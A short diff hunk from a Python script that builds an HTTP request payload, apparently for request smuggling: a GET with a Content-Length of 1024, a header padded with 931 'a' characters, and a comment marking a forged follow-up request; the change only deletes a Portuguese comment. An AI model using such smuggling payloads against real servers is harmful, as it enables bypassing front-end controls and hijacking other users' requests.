@@ -271,7 +271,7 @@ payload = (
     'GET /index.html HTTP/1.1\r\n'
     'Content-Length: 1024\r\n'
     'Host: localhost\r\n'
-    f'Foo: {"a"*931}\r\n'  # Preenche com caracteres "a"
+    f'Foo: {"a"*931}\r\n'  
     '\r\n'
 
     # Requisição forjada
